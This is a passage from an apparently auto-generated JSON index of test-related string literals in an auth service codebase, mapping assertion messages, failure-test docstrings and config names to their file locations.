      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:73"
      ]
    },
    "Expected 'staging mode' in logs, got:": {
      "value": "Expected 'staging mode' in logs, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:150"
      ]
    },
    "Expected 'staging' environment, got '": {
      "value": "Expected 'staging' environment, got '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:109"
      ]
    },
    "Expected 'user_pr-4' in URL:": {
      "value": "Expected 'user_pr-4' in URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:66"
      ]
    },
    "Expected SQLite URL, got:": {
      "value": "Expected SQLite URL, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_connection.py:21"
      ]
    },
    "Expected SQLite engine, got:": {
      "value": "Expected SQLite engine, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_connection.py:34"
      ]
    },
    "Expected SQLite or empty URL during tests, got:": {
      "value": "Expected SQLite or empty URL during tests, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_connection.py:78"
      ]
    },
    "Expected SSL-related error, got:": {
      "value": "Expected SSL-related error, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:188"
      ]
    },
    "Expected SSL:": {
      "value": "Expected SSL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:148"
      ]
    },
    "Expected STAGING, got": {
      "value": "Expected STAGING, got",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:30"
      ]
    },
    "Expected asyncpg driver in URL, got:": {
      "value": "Expected asyncpg driver in URL, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:53"
      ]
    },
    "Expected asyncpg format, got:": {
      "value": "Expected asyncpg format, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:50"
      ]
    },
    "Expected authentication error, got:": {
      "value": "Expected authentication error, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:481"
      ]
    },
    "Expected error code '": {
      "value": "Expected error code '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:170"
      ]
    },
    "Expected event type '": {
      "value": "Expected event type '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:264"
      ]
    },
    "Expected exit code:": {
      "value": "Expected exit code:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:26"
      ]
    },
    "Expected high usage warning, got:": {
      "value": "Expected high usage warning, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:173"
      ]
    },
    "Expected ssl=require parameter, got:": {
      "value": "Expected ssl=require parameter, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:68"
      ]
    },
    "Expected staging frontend URL, got:": {
      "value": "Expected staging frontend URL, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:240"
      ]
    },
    "Expected status": {
      "value": "Expected status",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:166"
      ]
    },
    "Expected success=": {
      "value": "Expected success=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:267"
      ]
    },
    "Expected token to be expired, but it's valid": {
      "value": "Expected token to be expired, but it's valid",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:66"
      ]
    },
    "Expected token_type 'Bearer', got '": {
      "value": "Expected token_type 'Bearer', got '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:143"
      ]
    },
    "Expected user_id '": {
      "value": "Expected user_id '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:271"
      ]
    },
    "Expected valid:": {
      "value": "Expected valid:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:240"
      ]
    },
    "Expired ID token should be rejected": {
      "value": "Expired ID token should be rejected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:88"
      ]
    },
    "Expired state parameters should be rejected": {
      "value": "Expired state parameters should be rejected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:196"
      ]
    },
    "FAIL": {
      "value": "FAIL",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:203",
        "scripts/test_verify_workflow.py:36",
        "scripts/test_verify_workflow.py:48",
        "scripts/test_verify_workflow.py:71",
        "scripts/test_verify_workflow_status_corrected.py:46",
        "scripts/test_verify_workflow_status_corrected.py:57",
        "scripts/test_verify_workflow_status_corrected.py:201",
        "scripts/test_websocket_dev_mode.py:304"
      ]
    },
    "FAIL: Found": {
      "value": "FAIL: Found",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:48"
      ]
    },
    "FAILED": {
      "value": "FAILED",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:232",
        "scripts/iterative_test_fix_loop.py:53",
        "scripts/test_auth_database_sessions.py:368",
        "scripts/test_auth_database_sessions.py:386",
        "scripts/test_database_url_builder_comprehensive.py:320",
        "scripts/test_database_url_builder_comprehensive.py:337",
        "scripts/test_example_message_flow.py:159",
        "scripts/test_failure_scanner.py:142",
        "scripts/test_ssl_certificates_staging.py:276",
        "scripts/test_ssl_certificates_staging.py:294"
      ]
    },
    "FAILED (": {
      "value": "FAILED (",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:65"
      ]
    },
    "FAILED FILES (": {
      "value": "FAILED FILES (",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:322"
      ]
    },
    "FAILED TESTS:": {
      "value": "FAILED TESTS:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:385"
      ]
    },
    "FAILED:": {
      "value": "FAILED:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:166",
        "scripts/test_auth_database_sessions.py:60",
        "scripts/test_auth_database_sessions.py:110",
        "scripts/test_auth_database_sessions.py:153",
        "scripts/test_auth_database_sessions.py:207",
        "scripts/test_auth_database_sessions.py:289",
        "scripts/test_auth_database_sessions.py:342",
        "scripts/test_ssl_certificates_staging.py:95",
        "scripts/test_ssl_certificates_staging.py:252",
        "scripts/test_staging_db_direct.py:95"
      ]
    },
    "FAILED: Alembic connection failed": {
      "value": "FAILED: Alembic connection failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:157"
      ]
    },
    "FAILED: AuthConfig URL connection failed:": {
      "value": "FAILED: AuthConfig URL connection failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:217"
      ]
    },
    "FAILED: AuthConfig URL has incorrect format": {
      "value": "FAILED: AuthConfig URL has incorrect format",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:145"
      ]
    },
    "FAILED: AuthConfig test failed:": {
      "value": "FAILED: AuthConfig test failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:183"
      ]
    },
    "FAILED: Cannot import AuthDatabaseManager:": {
      "value": "FAILED: Cannot import AuthDatabaseManager:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:57"
      ]
    },
    "FAILED: Configuration validation failed:": {
      "value": "FAILED: Configuration validation failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:139"
      ]
    },
    "FAILED: Could not generate migration URL": {
      "value": "FAILED: Could not generate migration URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:97"
      ]
    },
    "FAILED: Could not rename": {
      "value": "FAILED: Could not rename",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:194"
      ]
    },
    "FAILED: Credential validation error:": {
      "value": "FAILED: Credential validation error:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:272"
      ]
    },
    "FAILED: Credential validation failed": {
      "value": "FAILED: Credential validation failed",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:262"
      ]
    },
    "FAILED: DatabaseURLBuilder test failed:": {
      "value": "FAILED: DatabaseURLBuilder test failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:162"
      ]
    },
    "FAILED: Direct asyncpg connection failed:": {
      "value": "FAILED: Direct asyncpg connection failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:80"
      ]
    },
    "FAILED: No database URL generated": {
      "value": "FAILED: No database URL generated",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:62"
      ]
    },
    "FAILED: No database URL generated by AuthConfig": {
      "value": "FAILED: No database URL generated by AuthConfig",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:194",
        "auth_service/test_url_construction.py:134"
      ]
    },
    "FAILED: TCP connection failed (expected):": {
      "value": "FAILED: TCP connection failed (expected):",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:110"
      ]
    },
    "FAILED: URL generation failed:": {
      "value": "FAILED: URL generation failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:86"
      ]
    },
    "FAILED: URL missing expected components:": {
      "value": "FAILED: URL missing expected components:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:79"
      ]
    },
    "FAILED: URLs missing expected Cloud SQL patterns": {
      "value": "FAILED: URLs missing expected Cloud SQL patterns",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:116"
      ]
    },
    "FAILED: Unexpected URL format:": {
      "value": "FAILED: Unexpected URL format:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:213"
      ]
    },
    "FAILED\\s+([\\w/\\.]+::\\w+)": {
      "value": "FAILED\\s+([\\w/\\.]+::\\w+)",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:114"
      ]
    },
    "FAILING TEST ANALYSIS:": {
      "value": "FAILING TEST ANALYSIS:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:294"
      ]
    },
    "FAILING TEST: Real integration test that attempts database connection with invalid credentials.\n        \n        This test actually tries to connect to a database with invalid credentials,\n        replicating the exact failure scenario from production logs.": {
      "value": "FAILING TEST: Real integration test that attempts database connection with invalid credentials.\n        \n        This test actually tries to connect to a database with invalid credentials,\n        replicating the exact failure scenario from production logs.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:111"
      ]
    },
    "FAILING TEST: Replicates 'Shutdown timeout exceeded' warnings.\n        \n        This test demonstrates how database connections that fail to close\n        within the timeout period cause shutdown warnings and resource leaks.": {
      "value": "FAILING TEST: Replicates 'Shutdown timeout exceeded' warnings.\n        \n        This test demonstrates how database connections that fail to close\n        within the timeout period cause shutdown warnings and resource leaks.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:39"
      ]
    },
    "FAILING TEST: Replicates 'database \"netra_staging\" does not exist' error.\n        \n        This is the primary critical error found in staging logs where the auth service\n        attempts to connect to a database named \"netra_staging\" that doesn't exist.": {
      "value": "FAILING TEST: Replicates 'database \"netra_staging\" does not exist' error.\n        \n        This is the primary critical error found in staging logs where the auth service\n        attempts to connect to a database named \"netra_staging\" that doesn't exist.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:42"
      ]
    },
    "FAILING TEST: Replicates SHUTDOWN_TIMEOUT_SECONDS being ignored in staging.\n        \n        The staging environment might not respect the SHUTDOWN_TIMEOUT_SECONDS\n        configuration, causing shutdowns to exceed Cloud Run's termination window.": {
      "value": "FAILING TEST: Replicates SHUTDOWN_TIMEOUT_SECONDS being ignored in staging.\n        \n        The staging environment might not respect the SHUTDOWN_TIMEOUT_SECONDS\n        configuration, causing shutdowns to exceed Cloud Run's termination window.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:41"
      ]
    },
    "FAILING TEST: Replicates shutdown timeout exceeded warnings.\n        \n        This test demonstrates how database connections that fail to close\n        properly can cause shutdown timeouts, as seen in production logs.": {
      "value": "FAILING TEST: Replicates shutdown timeout exceeded warnings.\n        \n        This test demonstrates how database connections that fail to close\n        properly can cause shutdown timeouts, as seen in production logs.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:324"
      ]
    },
    "FAILING TEST: Replicates socket closure errors during cleanup operations.\n        \n        This test demonstrates how socket connections that are already closed\n        or in an invalid state cause errors during the cleanup process.": {
      "value": "FAILING TEST: Replicates socket closure errors during cleanup operations.\n        \n        This test demonstrates how socket connections that are already closed\n        or in an invalid state cause errors during the cleanup process.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:79"
      ]
    },
    "FAILING TEST: Replicates socket closure issues during shutdown.\n        \n        This test demonstrates how failed database connections can cause\n        socket closure errors during application shutdown, as seen in logs.": {
      "value": "FAILING TEST: Replicates socket closure issues during shutdown.\n        \n        This test demonstrates how failed database connections can cause\n        socket closure errors during application shutdown, as seen in logs.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:203"
      ]
    },
    "FAILING TEST: Replicates table creation failure due to authentication issues.\n        \n        This test demonstrates how authentication failures prevent table creation,\n        leading to the \"Table creation being skipped\" warnings in logs.": {
      "value": "FAILING TEST: Replicates table creation failure due to authentication issues.\n        \n        This test demonstrates how authentication failures prevent table creation,\n        leading to the \"Table creation being skipped\" warnings in logs.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:142"
      ]
    },
    "FAILING TEST: Shows regular PostgreSQL SSL parameter conversion issues.\n        \n        Root Cause: Auth service incorrectly handles SSL parameter conversion \n        for non-Cloud SQL connections.": {
      "value": "FAILING TEST: Shows regular PostgreSQL SSL parameter conversion issues.\n        \n        Root Cause: Auth service incorrectly handles SSL parameter conversion \n        for non-Cloud SQL connections.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:92"
      ]
    },
    "FAILING TEST: Shows staging deployment SSL configuration mismatch.\n        \n        Root Cause: Staging deployment configures sslmode=require in DATABASE_URL \n        but auth service expects no SSL parameters for Cloud SQL.": {
      "value": "FAILING TEST: Shows staging deployment SSL configuration mismatch.\n        \n        Root Cause: Staging deployment configures sslmode=require in DATABASE_URL \n        but auth service expects no SSL parameters for Cloud SQL.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:146"
      ]
    },
    "FAILING TEST: Tests Cloud Run SIGTERM handling timeout in staging.\n        \n        Cloud Run sends SIGTERM and gives ~10 seconds before SIGKILL. The service\n        should handle this gracefully within the allotted time.": {
      "value": "FAILING TEST: Tests Cloud Run SIGTERM handling timeout in staging.\n        \n        Cloud Run sends SIGTERM and gives ~10 seconds before SIGKILL. The service\n        should handle this gracefully within the allotted time.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:89"
      ]
    },
    "FAILING TEST: Tests Cloud SQL database name resolution failures.\n        \n        Cloud SQL might have different database naming conventions that cause\n        the \"netra_staging does not exist\" error.": {
      "value": "FAILING TEST: Tests Cloud SQL database name resolution failures.\n        \n        Cloud SQL might have different database naming conventions that cause\n        the \"netra_staging does not exist\" error.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:138"
      ]
    },
    "FAILING TEST: Tests Redis session cleanup hanging during service shutdown.\n        \n        Redis connections for session management might hang during cleanup,\n        preventing graceful shutdown within timeout limits.": {
      "value": "FAILING TEST: Tests Redis session cleanup hanging during service shutdown.\n        \n        Redis connections for session management might hang during cleanup,\n        preventing graceful shutdown within timeout limits.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:219"
      ]
    },
    "FAILING TEST: Tests SIGTERM signal handler timeout in staging deployment.\n        \n        The service should handle SIGTERM within a reasonable time frame,\n        but might hang on cleanup operations in staging.": {
      "value": "FAILING TEST: Tests SIGTERM signal handler timeout in staging deployment.\n        \n        The service should handle SIGTERM within a reasonable time frame,\n        but might hang on cleanup operations in staging.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:263"
      ]
    },
    "FAILING TEST: Tests SSL connection failures to Cloud SQL in staging.\n        \n        SSL configuration issues can cause connection failures even when\n        database name is correct.": {
      "value": "FAILING TEST: Tests SSL connection failures to Cloud SQL in staging.\n        \n        SSL configuration issues can cause connection failures even when\n        database name is correct.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:240"
      ]
    },
    "FAILING TEST: Tests background task cancellation during auth failures.\n        \n        This test demonstrates how background database operations may not\n        be properly cancelled when authentication failures occur during shutdown.": {
      "value": "FAILING TEST: Tests background task cancellation during auth failures.\n        \n        This test demonstrates how background database operations may not\n        be properly cancelled when authentication failures occur during shutdown.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:166"
      ]
    },
    "FAILING TEST: Tests cascade shutdown failures when database issues affect multiple services.\n        \n        This test demonstrates how database shutdown issues in the auth service\n        can cascade to affect other services that depend on authentication.": {
      "value": "FAILING TEST: Tests cascade shutdown failures when database issues affect multiple services.\n        \n        This test demonstrates how database shutdown issues in the auth service\n        can cascade to affect other services that depend on authentication.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:417"
      ]
    },
    "FAILING TEST: Tests connection pool disposal failures during shutdown.\n        \n        This test demonstrates how connection pools may not be properly\n        disposed of during shutdown, leading to resource leaks.": {
      "value": "FAILING TEST: Tests connection pool disposal failures during shutdown.\n        \n        This test demonstrates how connection pools may not be properly\n        disposed of during shutdown, leading to resource leaks.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:118"
      ]
    },
    "FAILING TEST: Tests connection pool exhaustion during authentication retries.\n        \n        This test demonstrates how repeated authentication failures can exhaust\n        the connection pool, leading to service unavailability.": {
      "value": "FAILING TEST: Tests connection pool exhaustion during authentication retries.\n        \n        This test demonstrates how repeated authentication failures can exhaust\n        the connection pool, leading to service unavailability.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:144"
      ]
    },
    "FAILING TEST: Tests connection retry behavior with persistent auth failures.\n        \n        This test demonstrates how authentication failures persist across retry attempts,\n        leading to complete connection failure and service unavailability.": {
      "value": "FAILING TEST: Tests connection retry behavior with persistent auth failures.\n        \n        This test demonstrates how authentication failures persist across retry attempts,\n        leading to complete connection failure and service unavailability.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:253"
      ]
    },
    "FAILING TEST: Tests database connection pools hanging during staging shutdown.\n        \n        Connection pools in staging might have connections that don't close properly,\n        causing shutdown timeouts.": {
      "value": "FAILING TEST: Tests database connection pools hanging during staging shutdown.\n        \n        Connection pools in staging might have connections that don't close properly,\n        causing shutdown timeouts.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:165"
      ]
    },
    "FAILING TEST: Tests database connection timeouts during auth service initialization.\n        \n        Connection timeouts during startup can prevent the auth service from starting.": {
      "value": "FAILING TEST: Tests database connection timeouts during auth service initialization.\n        \n        Connection timeouts during startup can prevent the auth service from starting.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:280"
      ]
    },
    "FAILING TEST: Tests database name configuration mismatches that cause similar errors.\n        \n        Related to the netra_staging issue - tests various database name misconfigurations\n        that could cause \"does not exist\" errors.": {
      "value": "FAILING TEST: Tests database name configuration mismatches that cause similar errors.\n        \n        Related to the netra_staging issue - tests various database name misconfigurations\n        that could cause \"does not exist\" errors.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:90"
      ]
    },
    "FAILING TEST: Tests multiple connection failures during service startup.\n        \n        This replicates scenarios where the auth service fails to initialize\n        database connections multiple times, causing startup failures.": {
      "value": "FAILING TEST: Tests multiple connection failures during service startup.\n        \n        This replicates scenarios where the auth service fails to initialize\n        database connections multiple times, causing startup failures.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:363"
      ]
    },
    "FAILING TEST: Tests service startup without comprehensive credential validation.\n        \n        This test demonstrates how the service can start up without validating\n        that the provided credentials actually work for database operations.": {
      "value": "FAILING TEST: Tests service startup without comprehensive credential validation.\n        \n        This test demonstrates how the service can start up without validating\n        that the provided credentials actually work for database operations.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:293"
      ]
    },
    "FAILING TEST: Tests session creation when underlying credentials are invalid.\n        \n        This test demonstrates how session creation can appear to succeed\n        but fail during actual database operations due to authentication issues.": {
      "value": "FAILING TEST: Tests session creation when underlying credentials are invalid.\n        \n        This test demonstrates how session creation can appear to succeed\n        but fail during actual database operations due to authentication issues.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:184"
      ]
    },
    "FAILING TEST: Tests signal handling during active database operations.\n        \n        This test demonstrates how the service may not handle termination\n        signals gracefully when database operations are in progress.": {
      "value": "FAILING TEST: Tests signal handling during active database operations.\n        \n        This test demonstrates how the service may not handle termination\n        signals gracefully when database operations are in progress.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:239"
      ]
    },
    "FAILING TEST: Tests that connection events don't properly handle auth failures.\n        \n        This test demonstrates how database connection events may not\n        properly detect and handle authentication failures.": {
      "value": "FAILING TEST: Tests that connection events don't properly handle auth failures.\n        \n        This test demonstrates how database connection events may not\n        properly detect and handle authentication failures.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:258"
      ]
    },
    "FAILING TEST: Tests that database validation is not properly enforced during initialization.\n        \n        This test demonstrates how the current initialization process can succeed\n        even when database credentials are invalid, leading to runtime failures.": {
      "value": "FAILING TEST: Tests that database validation is not properly enforced during initialization.\n        \n        This test demonstrates how the current initialization process can succeed\n        even when database credentials are invalid, leading to runtime failures.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:39"
      ]
    },
    "FAILING TEST: Tests that repeated authentication failures aren't handled gracefully.\n        \n        This test demonstrates how the service doesn't implement proper\n        backoff or circuit breaker patterns for authentication failures.": {
      "value": "FAILING TEST: Tests that repeated authentication failures aren't handled gracefully.\n        \n        This test demonstrates how the service doesn't implement proper\n        backoff or circuit breaker patterns for authentication failures.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:346"
      ]
    },
    "FAILING TEST: Tests that shutdown timeouts are not properly configurable or respected.\n        \n        This test demonstrates how hardcoded or improperly configured shutdown\n        timeouts can cause issues in different deployment environments.": {
      "value": "FAILING TEST: Tests that shutdown timeouts are not properly configurable or respected.\n        \n        This test demonstrates how hardcoded or improperly configured shutdown\n        timeouts can cause issues in different deployment environments.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:365"
      ]
    },
    "FAILING TEST: Tests that table creation failures are not properly handled.\n        \n        This replicates the scenario where table creation is skipped due to\n        authentication errors, but the service continues to operate incorrectly.": {
      "value": "FAILING TEST: Tests that table creation failures are not properly handled.\n        \n        This replicates the scenario where table creation is skipped due to\n        authentication errors, but the service continues to operate incorrectly.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:71"
      ]
    },
    "FAILURE: Multiple connection tests failed": {
      "value": "FAILURE: Multiple connection tests failed",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:322"
      ]
    },
    "FAILURE: URL construction has issues": {
      "value": "FAILURE: URL construction has issues",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:243"
      ]
    },
    "FAKE TEST ANALYSIS:": {
      "value": "FAKE TEST ANALYSIS:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:256"
      ]
    },
    "FATAL: password authentication failed for user 'postgres'": {
      "value": "FATAL: password authentication failed for user 'postgres'",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:263",
        "auth_service/tests/test_database_connection_validation.py:269"
      ]
    },
    "FERNET_KEY": {
      "value": "FERNET_KEY",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:83",
        "scripts/test_config_loading.py:34",
        "scripts/test_staging_config.py:55",
        "scripts/unified_test_runner.py:212"
      ]
    },
    "FINAL SUMMARY": {
      "value": "FINAL SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:128"
      ]
    },
    "FIXED TEST: Verifies that Cloud SQL sslmode parameters are properly removed.\n        \n        Root Cause: asyncpg doesn't recognize 'sslmode' parameter for Unix socket \n        connections to Cloud SQL. SSL parameters should be completely removed.": {
      "value": "FIXED TEST: Verifies that Cloud SQL sslmode parameters are properly removed.\n        \n        Root Cause: asyncpg doesn't recognize 'sslmode' parameter for Unix socket \n        connections to Cloud SQL. SSL parameters should be completely removed.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:35"
      ]
    },
    "FIXED_SESSION_12345": {
      "value": "FIXED_SESSION_12345",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1143"
      ]
    },
    "FIXES APPLIED (": {
      "value": "FIXES APPLIED (",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:315"
      ]
    },
    "FIXING ALL TEST ISSUES": {
      "value": "FIXING ALL TEST ISSUES",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:213"
      ]
    },
    "FIXING COMMON TEST ISSUES": {
      "value": "FIXING COMMON TEST ISSUES",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:66"
      ]
    },
    "FRONTEND_PORT": {
      "value": "FRONTEND_PORT",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:269"
      ]
    },
    "FRONTEND_URL": {
      "value": "FRONTEND_URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:45",
        "auth_service/tests/config/test_settings.py:192",
        "scripts/test_backend.py:93",
        "scripts/test_oauth_local.py:64",
        "scripts/test_oauth_local.py:64",
        "scripts/test_staging.py:30"
      ]
    },
    "Factory compliance does not default to staging": {
      "value": "Factory compliance does not default to staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:93"
      ]
    },
    "Factory status integration does not default to staging": {
      "value": "Factory status integration does not default to staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:102"
      ]
    },
    "Fail Fast:": {
      "value": "Fail Fast:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:367"
      ]
    },
    "Fail on any violations (for CI)": {
      "value": "Fail on any violations (for CI)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:259"
      ]
    },
    "Fail-fast strategy mode (default: category_failure)": {
      "value": "Fail-fast strategy mode (default: category_failure)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:817"
      ]
    },
    "Failed": {
      "value": "Failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:377",
        "scripts/test_oauth_local.py:379",
        "scripts/test_staging_deployment.py:98",
        "scripts/test_staging_deployment.py:121",
        "scripts/test_staging_deployment.py:142",
        "scripts/test_workflows_with_act.py:207"
      ]
    },
    "Failed for": {
      "value": "Failed for",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:223"
      ]
    },
    "Failed for case '": {
      "value": "Failed for case '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:118"
      ]
    },
    "Failed renames:": {
      "value": "Failed renames:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:284"
      ]
    },
    "Failed tests:": {
      "value": "Failed tests:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:196"
      ]
    },
    "Failed to analyze": {
      "value": "Failed to analyze",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:125"
      ]
    },
    "Failed to backup": {
      "value": "Failed to backup",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:766"
      ]
    },
    "Failed to convert": {
      "value": "Failed to convert",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:60"
      ]
    },
    "Failed to create": {
      "value": "Failed to create",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:411"
      ]
    },
    "Failed to create backup for": {
      "value": "Failed to create backup for",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:822"
      ]
    },
    "Failed to create thread:": {
      "value": "Failed to create thread:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:338"
      ]
    },
    "Failed to detect staging URL issue:": {
      "value": "Failed to detect staging URL issue:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:296"
      ]
    },
    "Failed to fix:": {
      "value": "Failed to fix:",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:393"
      ]
    },
    "Failed to import auth_core modules:": {
      "value": "Failed to import auth_core modules:",
      "category": "test_literals",
      "locations": [
